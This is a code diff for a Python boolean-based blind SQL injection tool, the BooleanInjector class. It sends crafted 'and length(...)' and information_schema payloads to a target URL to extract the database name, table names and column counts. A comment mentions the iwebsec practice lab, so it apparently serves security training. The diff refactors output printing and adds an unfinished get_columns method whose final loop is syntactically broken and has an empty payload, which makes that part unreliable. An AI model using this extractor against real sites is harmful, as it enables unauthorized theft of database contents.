@@ -14,6 +14,14 @@ fatal = f"[{colored("fatal_error", "white", "on_light_red")}]"
 def get_time():
     return f"[{colored(f"{datetime.datetime.now().strftime('%H:%M:%S.%f')}", "light_cyan")}]"
 
+def restrict_values(values):
+    def decorator(func):
+        def wrapper(*args, **kwargs):
+            if args and args[0] not in values:
+                raise ValueError
+            return func(*args, **kwargs)
+        return wrapper
+    return decorator
 
 def parse_url(url: str):
     if "?" in url:
@@ -136,11 +144,8 @@ class BooleanInjector:
         sqli_response = requests.get(url=payload, cookies=self.cookie)
         # print(get_time(), "[info]", "payload constructed:", payload)
         # 确认条件
-        if self.normal_response.text == sqli_response.text:
-            # print(get_time(), "[info]", "using payload:", payload)
-            return True
-        else:
-            return False
+        return True if self.normal_response.text == sqli_response.text else False
+
         # for iwebsec
         # return True if "welcome to iwebsec!!!" in sqli_response.text else False
 
@@ -150,9 +155,8 @@ class BooleanInjector:
                 payload = f"and length(database()) = {length} #"
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got database name length:", "light_green"),
-                          colored(f"{length}", "light_yellow"))
-                    if self.show_payload:
-                        print("\nby using payload:", colored(self.construct_payload(payload, point), "cyan"))
+                          colored(f"{length}", "light_yellow"),
+                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}")
                     self.db_length = length
                     return length
         print(get_time(), fatal, colored("Unable to get database name length.", "red"))
@@ -174,9 +178,11 @@ class BooleanInjector:
             if extracted_name != "":
                 self.db_name = extracted_name
                 print(get_time(), info, colored("Got database name:", "light_green"),
-                      colored(extracted_name, "light_yellow"), "\nby using payloads:")
-                for payload in payload_list:
-                    print(colored(payload, "cyan"))
+                      colored(extracted_name, "light_yellow"),
+                      end="by using payload\n" if self.show_payload else "\n")
+                if self.show_payload:
+                    for payload in payload_list:
+                        print(colored(payload, "cyan"))
                 break
             else:
                 print(get_time(), fatal, colored("unable to get database name length.", "red"))
@@ -192,18 +198,20 @@ class BooleanInjector:
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got table count:", "light_green"),
                           colored(f"{length}", "light_yellow"),
-                          "\nby using payload:", colored(self.construct_payload(payload, point), "cyan"))
+                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                          if self.show_payload else "\n")
                     table_count = length
                     break
             # get tables length
             for table in range(0, table_count):
-                print(get_time(), info, f"fetching No.{table} table length...")
+                print(get_time(), info, f"fetching No.{table + 1} table length...")
                 for length in range(0, 32):
                     payload = f"and length((select table_name from information_schema.tables where table_schema=database() limit {table},1))={length}"
                     if self.get_payload_result(payload, point):
                         print(get_time(), info, colored(f"Got No.{table + 1} table length:", "light_green"),
                               colored(f"{length}", "light_yellow"),
-                              "\nby using payload:", colored(self.construct_payload(payload, point), "cyan"))
+                              end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                              if self.show_payload else "\n")
                         table_length.append(length)
                         payload_list = []
                         extracted_name = ""
@@ -217,12 +225,39 @@ class BooleanInjector:
                                     payload_list.append(self.construct_payload(payload, point))
                                     extracted_name += chr(char)
                         print("\n", end="")
-                        print(get_time(), info, colored(f"Got No.{table} name:", "light_green"),
-                              colored(extracted_name, "light_yellow"), "\nby using payloads:")
-                        for payload in payload_list:
-                            print(colored(payload, "cyan"))
+                        print(get_time(), info, colored(f"Got No.{table + 1} name:", "light_green"),
+                              colored(extracted_name, "light_yellow"),
+                              end="by using payload\n" if self.show_payload else "\n")
+                        self.tables.append(extracted_name)
+                        if self.show_payload:
+                            for payload in payload_list:
+                                print(colored(payload, "cyan"))
                         break
         if len(table_length) == 0:
             print(fatal)
 
-    # def get_columns(self):
+    # @restrict_values(self.tables)
+    def get_columns(self, witch_table: str = "all"):
+
+        columns_length, columns_count = [], []
+        print(self.tables)
+        for point in range(0, self.params_count):
+            # get column count
+            for table in self.tables:
+                for c in range(1, 32):
+                    payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0) #"
+                    if self.get_payload_result(payload, point):
+                        columns_count.append(c)
+                        print(get_time(), info, colored(f"Got table[{table}] columns count: {c}"),
+                              end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
+                        break
+            # got all column counts in every table, then get column name length
+            for column in :
+                for length in range(1, 32):
+                    payload = f""
+                    if self.get_payload_result(payload, point):
+                        columns_length.append(length)
+
+
+
+
